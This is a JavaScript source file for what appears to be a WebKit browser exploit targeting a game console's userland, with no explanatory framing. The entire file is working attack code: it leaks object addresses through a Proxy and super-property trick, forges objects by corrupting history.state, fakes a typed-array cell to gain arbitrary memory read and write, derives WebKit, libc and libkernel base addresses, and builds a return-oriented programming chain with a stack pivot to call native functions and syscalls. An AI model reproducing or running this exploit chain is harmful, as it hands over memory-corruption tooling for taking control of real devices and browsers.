//#region Constants
const fn = {};
const structs = new Map();

let webkit_base = undefined;
let libc_base = undefined;
let libkernel_base = undefined;

const mem = {
  allocs: new Set(),
  alloc(len, pair = false) {
    const ab = new ArrayBuffer(len);
    this.allocs.add(ab);
    return pair ? [ab, ab.data()] : ab.data();
  },
  free(ab) {
    return this.allocs.delete(ab);
  },
  free_all() {
    for (const ab of this.allocs) {
      ab.free(); // fix to avoid crash
    }

    this.allocs.clear();
  },
  copy(dst, src, len) {
    const src_u8 = new Uint8Array(ArrayBuffer.from(src, len));
    const dst_u8 = new Uint8Array(ArrayBuffer.from(dst, len));

    dst_u8.set(src_u8);
  },
  bset(addr, len, value = 0) {
    const u8 = new Uint8Array(ArrayBuffer.from(addr, len));
    u8.fill(value);
  },
  strlen(addr, max = 0x7fff) {
    const u8 = new Uint8Array(ArrayBuffer.from(addr, max));

    const len = u8.indexOf(0);
    if (len === -1) {
      throw new Error('not null-terminated string !!');
    }

    return len;
  },
};

const arw = {
  leak: { obj: 0 },
  leak_addr: undefined,
  master: new Uint32Array(6),
  victim: new DataView(new ArrayBuffer(0x30)),
  init() {
    logger.info('Initiate ARW...');

    if (!is_worker) {
      function addrof(...objs) {
        class Leaker {
          leak() {
            return super.foo;
          }
        }

        Leaker.prototype.__proto__ = new Proxy(
          {},
          {
            get(target, propertyName, receiver) {
              return receiver;
            },
          },
        );

        const { leak } = Leaker.prototype;

        const scope = (() => leak())();

        const getter = () => {};

        for (let i = 0; i < 0x10000; i++) {
          getter[i] = i;
        }

        for (let i = 0; i < objs.length; i++) {
          getter[i] = objs[i];
        }

        Object.defineProperty(scope, 'a', { get: getter, configurable: true });
        const leak_symbol = Object(scope.a);
        const leak_str = leak_symbol.toString().slice(7);

        const addrs = new Array(objs.length);
        const view = new DataView(new ArrayBuffer(8));

        for (let i = 0; i < objs.length; i++) {
          for (let j = 0; j < 4; j++) {
            const c = leak_str.charCodeAt(i * 4 + j);

            view.setUint8(j * 2, c & 0xff);
            view.setUint8(j * 2 + 1, c >> 8);
          }

          addrs[i] = view.getBInt(0, true);
        }

        return addrs;
      }

      function fakeobj(addr) {
        const crafted = new Array(0x10000);
        const spray = new Array(crafted.length - 3);

        let i = 0;
        spray[i++] = 1n;
        spray[i++] = new ArrayBuffer(0x400000);
        spray[i++] = new ArrayBuffer(0x400000);
        for (; i < spray.length; i++) {
          spray[i] = {};
        }

        crafted[0] = spray;
        crafted[1] = {};
        crafted[2] = crafted;
        crafted[crafted.length - 6] = -64000;

        const spray_1_u32 = new Uint32Array(spray[1]);
        const spray_2_u32 = new Uint32Array(spray[2]);

        for (let j = 0; j < spray_1_u32.length; j += 2) {
          spray_1_u32[j] = addr.lo;
          spray_1_u32[j + 1] = addr.hi;
        }

        spray_2_u32.set(spray_1_u32);

        history.replaceState(crafted, '');
        const corrupted = history.state;

        if (corrupted.length !== 0x50001) {
          throw new Error('fakeobj failed !!');
        }

        history.replaceState(null, '');

        return corrupted[2];
      }

      const jscell_view = new DataView(new ArrayBuffer(8));

      jscell_view.setInt32(0, 0x80, true); // StructureID
      jscell_view.setUint8(4, 0, true); // IndexingType::NonArray
      jscell_view.setUint8(5, 0x2c, true); // JSType::Int32ArrayType
      jscell_view.setUint8(6, 6, true); // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot with NaN-boxing
      jscell_view.setUint8(7, 1, true); // CellType::DefinitelyWhite

      const container = impl.make_fake_container(jscell_view.getFloat64(0, true));
      const [leak_addr, master_addr, victim_addr, container_addr] = addrof(arw.leak, arw.master, arw.victim, container);

      logger.debug(`leak_addr: ${leak_addr}`);
      logger.debug(`master_addr: ${master_addr}`);
      logger.debug(`victim_addr: ${victim_addr}`);
      logger.debug(`container_addr: ${container_addr}`);

      arw.leak_addr = leak_addr;

      const fake_addr = container_addr.add(0x10);
      logger.debug(`fake_addr: ${fake_addr}`);

      const fake = fakeobj(fake_addr);
      const dummy = new Uint32Array(7);

      // caches fake structureID into OpGetByVal.m_arrayProfile.m_lastSeenStructureID.
      // To avoid crashing GC, we simply execute the op_get_by_val twice.
      const results = new Array(2);
      for (let i = 0; i < results.length; i++) {
        const arr = i == 0 ? fake : dummy;
        results[i] = arr[6];
      }

      // verify is fake
      if (results[0] !== arw.victim.byteLength) {
        throw new Error('Unexpected victim length !!');
      }

      // caches fake structureID into OpPutByVal.m_arrayProfile.m_lastSeenStructureID.
      // To avoid crashing GC, we simply execute the op_put_by_val twice.
      for (let i = 0; i < 2; i++) {
        const arr = i == 0 ? fake : dummy;

        arr[4] = master_addr.lo;
        arr[5] = master_addr.hi;
      }

      impl.make_master(victim_addr);

      // convert view to TypedArrayMode::WastefulTypedArray so that it no longer frees m_vector on GC
      arw.master.buffer;

      // replace fake view jscell with valid one
      const dummy_addr = arw.addrof(dummy);
      logger.debug(`dummy_addr: ${dummy_addr}`);

      const dummy_jscell = arw.view(dummy_addr).getBInt(0, true);
      logger.debug(`dummy_jscell: ${dummy_jscell}`);

      arw.view(fake_addr).setBInt(0, dummy_jscell, true);
    }

    // set arw.victim's length to max
    impl.fix_victim();

    logger.info('Achieved ARW !!');
  },
  view(addr) {
    if (addr.eq(0)) {
      throw new Error('Empty addr !!');
    }

    this.master[4] = addr.lo;
    this.master[5] = addr.hi;

    return this.victim;
  },
  addrof(obj) {
    this.leak.obj = obj;
    return this.view(this.leak_addr).getBInt(0x10, true);
  },
  fakeobj(addr) {
    this.view(this.leak_addr).setBInt(0x10, addr, true);
    return this.leak.obj;
  },
};

const rop = {
  stack: undefined,
  frame: undefined,
  insts: [],
  init() {
    logger.info('Initiate ROP...');

    const math_expm1_addr = arw.addrof(Math.expm1);
    logger.debug(`math_expm1_addr: ${math_expm1_addr}`);

    const m_executableOrRareData = arw.view(math_expm1_addr).getBInt(0x18, true);
    logger.debug(`m_executableOrRareData: ${m_executableOrRareData}`);

    const m_function = arw.view(m_executableOrRareData).getBInt(impl.wk_JSFunction_m_function, true);
    logger.debug(`m_function: ${m_function}`);

    webkit_base = m_function.sub(impl.wk_expm1_builtin);
    logger.debug(`webkit_base: ${webkit_base}`);

    const strerror_addr = arw.view(webkit_base).getBInt(impl.wk___imp_strerror, true);
    logger.debug(`strerror_addr: ${strerror_addr}`);

    const _error_addr = arw.view(webkit_base).getBInt(impl.wk___imp___error, true);
    logger.debug(`_error_addr: ${_error_addr}`);

    libc_base = strerror_addr.sub(impl.lc_strerror);
    logger.info(`libc base: ${libc_base}`);

    libkernel_base = _error_addr.sub(impl.lk__error);
    logger.info(`libkernel base: ${libkernel_base}`);

    init_syscalls();

    rop.stack = new Stack(0x2000);
    rop.frame = new Frame([
      'org_rip_addr',
      'org_ptr_addr',
      'org_rip_val',
      'org_ptr_val',
      'rsp',
      'rax',
      'rip',
      'rdi',
      'rsi',
      'rdx',
      'rcx',
      'r8',
      'r9',
    ]);

    rop.insts.push(impl.wk_POP_RAX_RET);
    rop.frame.valueof(rop.insts, 'rax');

    rop.insts.push(impl.wk_POP_RDI_RET);
    rop.frame.valueof(rop.insts, 'rdi');

    rop.insts.push(impl.wk_POP_RSI_RET);
    rop.frame.valueof(rop.insts, 'rsi');

    rop.insts.push(impl.wk_POP_RDX_RET);
    rop.frame.valueof(rop.insts, 'rdx');

    rop.insts.push(impl.wk_POP_RCX_RET);
    rop.frame.valueof(rop.insts, 'rcx');

    rop.insts.push(impl.wk_POP_R8_RET);
    rop.frame.valueof(rop.insts, 'r8');

    rop.insts.push(impl.wk_POP_R9_RET);
    rop.frame.valueof(rop.insts, 'r9');

    rop.frame.valueof(rop.insts, 'rip');

    rop.frame.store(rop.insts, 'rax');

    rop.insts.push(impl.wk_POP_RAX_RET);
    rop.frame.valueof(rop.insts, 'org_rip_val');
    rop.insts.push(impl.wk_POP_RDI_RET);
    rop.frame.valueof(rop.insts, 'org_rip_addr');
    rop.insts.push(impl.wk_MOV_QWORD_PTR_RDI_RAX_RET);

    rop.insts.push(impl.wk_POP_RAX_RET);
    rop.frame.valueof(rop.insts, 'org_ptr_val');
    rop.insts.push(impl.wk_POP_RDI_RET);
    rop.frame.valueof(rop.insts, 'org_ptr_addr');
    rop.insts.push(impl.wk_MOV_QWORD_PTR_RDI_RAX_RET);

    rop.insts.push(impl.wk_POP_RBP_RET);
    rop.frame.valueof(rop.insts, 'rsp');
    rop.insts.push(impl.wk_POP_RAX_RET);
    rop.insts.push(0);
    rop.insts.push(impl.wk_LEAVE_RET);

    fn._error = new NativeFunction(_error_addr, 'bint');
    fn._strerror = new NativeFunction(strerror_addr, 'string');
    fn.nanosleep = new NativeFunction(0xf0, 'number');
    fn.getpid = new NativeFunction(0x14, 'number');

    logger.info('Achieved ROP !!');
  },
  reset() {
    this.stack.reset();
    this.frame.reset();
  },
  execute() {
    const global_this_addr = arw.addrof(globalThis);
    const js_global_object_addr = arw.view(global_this_addr).getBInt(0x10, true);
    const m_vm = arw.view(js_global_object_addr).getBInt(0x38, true);

    const pivot = function () {
      const rbp = arw.view(m_vm).getBInt(impl.wk_JSGlobalObject_m_vm_topEntryFrame, true);

      const original_ret_addr = rbp.add(8);
      const original_ptr_addr = rbp.add(0x10);
      const original_ret = arw.view(rbp).getBInt(8, true);
      const original_ptr = arw.view(rbp).getBInt(0x10, true);

      rop.frame.set_value('rsp', rbp);
      rop.frame.set_value('org_rip_addr', original_ret_addr);
      rop.frame.set_value('org_ptr_addr', original_ptr_addr);
      rop.frame.set_value('org_rip_val', original_ret);
      rop.frame.set_value('org_ptr_val', original_ptr);

      rop.stack.prepare(rop.insts, rop.frame);

      const sp = rop.stack.sp;
      arw.view(rbp).setBInt(8, impl.wk_POP_RSP_RET, true);
      arw.view(rbp).setBInt(0x10, sp, true);
    };

    pivot.bind(this)();
  },
};
//#endregion
//#region Classes
class SyscallError extends Error {
  constructor(message) {
    super(`${message}\n\terrno ${errno()}: ${strerror()}`);
    this.name = 'SyscallError';
  }
}

class Stack {
  constructor(size) {
    if (size % 8 !== 0) {
      throw new Error('Invalid stack size, not aligned by 8 bytes');
    }

    if (size < 0x1000) {
      throw new Error('Invalid stack size, minimal size is 0x1000 to init ROP');
    }

    this.view = new DataView(new ArrayBuffer(size));
    this.reset();
  }

  reset() {
    new Uint8Array(this.view.buffer).fill(0);
    this.offset = this.view.byteLength;
  }

  get sp() {
    return this.view.buffer.data().add(this.offset);
  }

  /**
   * @param {Array} insts
   * @param {Frame} frame
   */
  prepare(insts, frame) {
    this.reset();

    for (let i = insts.length - 1; i >= 0; i--) {
      if (this.offset < 8) {
        throw new Error('Stack full !!');
      }

      let inst = insts[i];

      switch (typeof inst) {
        case 'boolean':
        case 'number':
          inst = new BInt(inst);
          break;
        case 'string':
          if (typeof frame === 'undefined') {
            throw new Error('Unable to resolve symbol without frame !!');
          }

          inst = frame.instof(inst);
          break;
        default:
          if (!(inst instanceof BInt)) {
            throw new Error(`Invalid inst of type ${typeof value}`);
          }
      }

      this.offset -= 8;
      this.view.setBInt(this.offset, inst, true);
    }
  }
}
class Frame {
  constructor(list) {
    if (!Array.isArray(list)) {
      throw new Error('Input frame is not an array !!');
    }

    if (list.length === 0) {
      throw new Error('Empty frame length !!');
    }

    this.pop_view = new DataView(new ArrayBuffer(8));
    this.view = new DataView(new ArrayBuffer(list.length * 8));

    for (let i = 0; i < list.length; i++) {
      const name = list[i];

      if (typeof name !== 'string') {
        throw new TypeError(`${name} not a string !!`);
      }

      if (name in this) {
        throw new Error(`Duplicated local variable ${name} !!`);
      }

      this[name] = i;
    }
  }

  reset() {
    new Uint8Array(this.view.buffer).fill(0);
  }

  instof(name) {
    let as_value = false;

    if (name.startsWith('[') && name.endsWith(']')) {
      name = name.slice(1, -1);
      as_value = true;
    }

    if (name in this) {
      return as_value ? this.get_value(name) : this.addrof(name);
    }

    throw new Error(`${name} not in frame !!`);
  }

  addrof(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.buffer.data().add(this[name] * 8);
  }

  get_value(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.getBInt(this[name] * 8, true);
  }

  set_value(name, value) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    this.view.setBInt(this[name] * 8, value, true);
  }

  valueof(insts, name) {
    insts.push(`[${name}]`);
  }

  store(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(impl.wk_POP_RDI_RET);
    insts.push(name);
    insts.push(impl.wk_MOV_QWORD_PTR_RDI_RAX_RET);
  }

  load(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(impl.wk_POP_RDI_RET);
    insts.push(name);
    insts.push(impl.wk_MOV_RAX_QWORD_PTR_RDI_RET);
  }

  pop(insts, gadget, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(impl.wk_POP_RAX_RET);
    insts.push(gadget);
    insts.push(impl.wk_POP_RDI_RET);
    insts.push(this.pop_view.buffer.data());
    insts.push(impl.wk_MOV_QWORD_PTR_RDI_RAX_RET);

    insts.push(impl.wk_POP_RBX_RET);
    insts.push(name);
    insts.push(impl.wk_POP_RAX_RET);
    insts.push(this.pop_view.buffer.data());
    insts.push(impl.wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX);
  }
}
class NativeFunction {
  constructor(input, ret) {
    this.ret = ret;

    if (input instanceof BInt) {
      this.addr = input;
    } else if (typeof input === 'number') {
      this.addr = get_syscall(input);
      this.id = input;
    }
  }

  invoke(...args) {
    if (args.length > 6) {
      throw new Error('More than 6 arguments is not supported !!');
    }

    rop.reset();

    rop.frame.set_value('rip', this.addr);
    rop.frame.set_value('rax', this.id ?? 0);

    const ctx = [];
    const regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'];

    for (let i = 0; i < regs.length; i++) {
      const reg = regs[i];

      let value = args[i] ?? 0;

      switch (typeof value) {
        case 'boolean':
        case 'number':
          break;
        case 'string':
          value = value.cstr();
          ctx.push(value);
          break;
        default:
          if (!(value instanceof BInt)) {
            throw new Error(`Invalid value of type ${typeof value} at arg ${i}`);
          }
      }

      rop.frame.set_value(reg, value);
    }

    rop.execute();

    while (ctx.length > 0) {
      mem.free(ctx.pop());
    }

    let result;
    if (this.ret) {
      result = rop.frame.get_value('rax');

      switch (this.ret) {
        case 'bint':
          break;
        case 'number':
          result = result.i;
          break;
        case 'boolean':
          result = result.eq(1);
          break;
        case 'string':
          result = String.from(result);
          break;
        default:
          throw new Error(`Unsupported return type ${this.ret}`);
      }
    }

    return result;
  }

  chain(...args) {
    if (args.length < 1) {
      throw new Error('insts argument is required to chain with !!');
    }

    if (!Array.isArray(args[0])) {
      throw new Error('insts argument is not an array !!');
    }

    if (args.length > 7) {
      throw new Error('More than 6 arguments is not supported !!');
    }

    const regs = [impl.wk_POP_RDI_RET, impl.wk_POP_RSI_RET, impl.wk_POP_RDX_RET, impl.wk_POP_RCX_RET, impl.wk_POP_R8_RET, impl.wk_POP_R9_RET];

    const insts = args[0];

    insts.push(impl.wk_POP_RAX_RET);
    insts.push(this.id ?? 0);

    for (let i = 1; i < args.length; i++) {
      const reg = regs[i - 1];

      insts.push(reg);

      let value = args[i];

      switch (typeof value) {
        case 'boolean':
        case 'number':
          break;
        case 'string':
          value = value.cstr();
          break;
        default:
          if (!(value instanceof BInt)) {
            throw new Error(`Invalid value at arg ${i - 1}`);
          }
      }

      insts.push(value);
    }

    insts.push(this.addr);
  }
}

class Struct {
  constructor(name, fields) {
    if (!Array.isArray(fields)) {
      throw new Error('Input fields is not an array !!');
    }

    if (fields.length === 0) {
      throw new Error('Empty fields array !!');
    }

    if (structs.has(name)) {
      return structs.get(name);
    }

    let offset = 0;
    let alignof = 1;

    this.name = name;
    this.fields = {};

    for (const field of fields) {
      if (field.name in this.fields) {
        throw new Error(`Duplicated field name ${field.name} !!`);
      }

      const { size, align } = Struct.type_info(field.type);

      field.size = size;
      field.align = align;
      field.count = field.count ?? 1;
      field.offset = offset = offset.alignUp(align);

      offset += field.size * field.count;
      alignof = Math.max(alignof, field.align);

      this.fields[field.name] = field;
    }

    this.sizeof = offset.alignUp(alignof);
    this.alignof = alignof;

    logger.debug(`registering ${this.name}: sizeof: ${this.sizeof}, alignof: ${this.alignof}`);

    structs.set(this.name, this);
  }

  new(addr) {
    const instance = { addr: addr ?? mem.alloc(this.sizeof), struct: this };
    return new Proxy(instance, {
      get: (target, prop) => {
        if (prop in target) return target[prop];

        if (!isNaN(prop)) {
          const i = Number(prop);
          return target.struct.new(target.addr.add(i * target.struct.sizeof));
        }

        const field = target.struct.fields[prop];
        if (!field) return undefined;

        let type = field.type;
        let addr = target.addr.add(field.offset);

        if (field.count > 1) {
          const size = field.size * field.count;
          const buf = ArrayBuffer.from(addr, size);

          switch (type) {
            case 'Int8':
              return new Int8Array(buf);
            case 'Uint8':
              return new Uint8Array(buf);
            case 'Int16':
              return new Int16Array(buf);
            case 'Uint16':
              return new Uint16Array(buf);
            case 'Int32':
              return new Int32Array(buf);
            case 'Uint32':
              return new Uint32Array(buf);
            case 'Int64':
            case 'Uint64':
              throw new Error(`type ${field.type} not supported !!`);
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        } else {
          if (type.endsWith('*')) {
            type = type.slice(0, -1);
            addr = arw.view(target.addr).getBInt(field.offset, true);
          }

          if (structs.has(type)) {
            const struct = structs.get(type);
            return struct.new(addr);
          }

          switch (type) {
            case 'Int8':
              return arw.view(addr).getInt8(0, true);
            case 'Uint8':
              return arw.view(addr).getUint8(0, true);
            case 'Int16':
              return arw.view(addr).getInt16(0, true);
            case 'Uint16':
              return arw.view(addr).getUint16(0, true);
            case 'Int32':
              return arw.view(addr).getInt32(0, true);
            case 'Uint32':
              return arw.view(addr).getUint32(0, true);
            case 'Int64':
            case 'Uint64':
              return arw.view(addr).getBInt(0, true);
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        }
      },
      set: (target, prop, value) => {
        if (!isNaN(prop)) {
          const i = Number(prop);
          if (!value.hasOwnProperty('struct')) {
            throw new Error('Value is not a Struct');
          }

          if (target.struct.name !== value.struct.name) {
            throw new Error(`Expected ${target.struct.name} got ${value.struct.name} !!`);
          }

          mem.copy(target.addr.add(i * target.struct.sizeof), value.addr, target.struct.sizeof);
          return true;
        }

        const field = target.struct.fields[prop];
        if (!field) return undefined;

        let type = field.type;
        let addr = target.addr.add(field.offset);

        if (field.count > 1) {
          const size = field.size * field.count;

          if (!ArrayBuffer.isView(value)) {
            throw new Error('Value is not a TypedArray');
          }

          if (value.buffer.byteLength !== size) {
            throw new Error(`Expected ${size} bytes got ${value.buffer.byteLength} !!`);
          }

          mem.copy(addr, value.buffer.getBackingStore(), size);
        } else {
          if (type.endsWith('*')) {
            if (!(value instanceof BInt)) {
              throw new Error('Value is not a pointer');
            }

            arw.view(target.addr).setBInt(field.offset, value, true);
            return true;
          }

          if (structs.has(type)) {
            const struct = structs.get(type);

            if (!value.hasOwnProperty('addr')) {
              throw new Error('Value is not a Struct');
            }

            mem.copy(addr, value.addr, struct.sizeof);
            return true;
          }

          switch (type) {
            case 'Int8':
              arw.view(addr).setInt8(0, value, true);
              break;
            case 'Uint8':
              arw.view(addr).setUint8(0, value, true);
              break;
            case 'Int16':
              arw.view(addr).setInt16(0, value, true);
              break;
            case 'Uint16':
              arw.view(addr).setUint16(0, value, true);
              break;
            case 'Int32':
              arw.view(addr).setInt32(0, value, true);
              break;
            case 'Uint32':
              arw.view(addr).setUint32(0, value, true);
              break;
            case 'Int64':
            case 'Uint64':
              arw.view(addr).setBInt(0, value, true);
              break;
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        }

        return true;
      },
    });
  }

  static type_info(type) {
    if (type.endsWith('*')) {
      return { size: 8, align: 8 };
    } else if (structs.has(type)) {
      const t = structs.get(type);
      return { size: t.sizeof, align: t.alignof };
    } else {
      const sz = Struct.type_size(type);
      return { size: sz, align: sz };
    }
  }

  static type_size(type) {
    const sizes = {
      Int8: 1,
      Uint8: 1,
      Int16: 2,
      Uint16: 2,
      Int32: 4,
      Uint32: 4,
      Int64: 8,
      Uint64: 8,
    };

    if (!(type in sizes)) {
      throw new Error(`Invalid primitive type ${type}`);
    }

    return sizes[type];
  }
}
//#endregion
//#region Extensions
ArrayBuffer.prototype.data = function () {
  return impl.ab_data(this);
};

ArrayBuffer.prototype.fake = function (addr, len) {
  impl.ab_fake(this, addr, len);
};

ArrayBuffer.prototype.free = function () {
  if (this.hasOwnProperty('m_data')) {
    impl.ab_free(this);
  }
};

String.prototype.cstr = function () {
  const [ab, _] = mem.alloc(this.length + 1, true);
  const u8 = new Uint8Array(ab);

  for (let i = 0; i < this.length; i++) {
    u8[i] = this.charCodeAt(i) & 0xff;
  }

  u8[this.length] = 0;

  return ab.data();
};
//#endregion
//#region Static
String.from = function (addr, len) {
  if (addr.eq(0)) return '';

  len = len ?? mem.strlen(addr);

  if (len === 0) return '';

  const u8 = new Uint8Array(len);

  mem.copy(u8.buffer.data(), addr, len);

  return new TextDecoder().decode(u8);
};

ArrayBuffer.from = function (addr, len = -1) {
  if (addr.eq(0)) {
    throw new RangeError('Empty addr !!');
  }

  const [ab, _] = mem.alloc(0, true);
  ab.fake(addr, len);

  return ab;
};
//#endregion
//#region Functions
function errno() {
  if (!fn.hasOwnProperty('_error')) {
    throw new Error('_error undefined !!');
  }

  return arw.view(fn._error.invoke()).getUint32(0, true);
}

function strerror() {
  if (!fn.hasOwnProperty('_strerror')) {
    throw new Error('strerror undefined !!');
  }

  return fn._strerror.invoke(errno());
}

function sleep(ms = 0) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function nsleep(nsec) {
  const time = timespec.new();

  time.tv_sec = Math.floor(nsec / 1e9);
  time.tv_nsec = nsec % 1e9;

  if (fn.nanosleep.invoke(time.addr) === -1) {
    throw new SyscallError(`Unable to sleep for ${nsec} nano seconds !!`);
  }

  mem.free(time.addr);
}

function hexdump(addr, len) {
  if (len % 8 !== 0) {
    throw new Error('len not multiple of 8 !!');
  }

  logger.debug(`${addr} hexdump:`);

  const ab = ArrayBuffer.from(addr, len);
  const dv = new DataView(ab);

  for (let i = 0; i < dv.byteLength; i += 8) {
    const value = dv.getBInt(i, true);
    logger.debug(`${value} : ${i.hex()}`);
  }
}

function notify(msg) {
  const request = NotificationRequest.new();

  const u8 = new TextEncoder().encode(msg);
  request.message.set(u8);

  const fd = fn.open.invoke('/dev/notification0', 1, 0);
  if (fd < 0) {
    throw new SyscallError('Unable to open /dev/notification0 !!');
  }

  fn.write.invoke(fd, request.addr, NotificationRequest.sizeof);
  fn.close.invoke(fd);

  mem.free(request.addr);
}

async function userland_main() {
  logger.info('===USERLAND===');

  arw.init();
  rop.init();

  const pid = fn.getpid.invoke();
  logger.debug(`pid: ${pid}`);

  logger.info('===END===');
}
//#endregion
//#region Structs
const timespec = new Struct('timespec', [
  { type: 'Int64', name: 'tv_sec' },
  { type: 'Int64', name: 'tv_nsec' },
]);

const NotificationRequest = new Struct('NotificationRequest', [
  { type: 'Int32', name: 'type' },
  { type: 'Int32', name: 'reqId' },
  { type: 'Int32', name: 'priority' },
  { type: 'Int32', name: 'msg_id' },
  { type: 'Int32', name: 'target_id' },
  { type: 'Int32', name: 'user_id' },
  { type: 'Int32', name: 'unk1' },
  { type: 'Int32', name: 'unk2' },
  { type: 'Int32', name: 'app_id' },
  { type: 'Int32', name: 'error_num' },
  { type: 'Int32', name: 'unk3' },
  { type: 'Uint8', name: 'use_icon_image_uri' },
  { type: 'Uint8', name: 'message', count: 1024 },
  { type: 'Uint8', name: 'icon_uri', count: 1024 },
  { type: 'Uint8', name: 'unk', count: 1024 },
]);
//#endregion
